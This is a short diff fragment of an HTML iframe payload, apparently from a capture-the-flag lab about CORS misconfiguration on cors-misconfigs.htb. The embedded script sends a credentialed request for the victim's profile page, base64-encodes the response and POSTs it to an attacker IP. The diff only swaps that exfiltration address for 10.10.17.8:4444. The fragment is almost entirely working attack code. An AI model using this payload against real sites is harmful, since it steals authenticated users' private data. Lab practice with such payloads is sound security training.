@@ -43,7 +43,7 @@ HTML
     xhr.open('GET', 'https://cors-misconfigs.htb/profile.php', true);
     xhr.withCredentials = true; 
     xhr.onload = () => {
-        fetch('https://10.10.17.142', {method:'POST', body: btoa(xhr.responseText)});
+        fetch('http://10.10.17.8:4444', {method:'POST', body: btoa(xhr.responseText)});
     };
     xhr.send();
 </script>"></iframe>
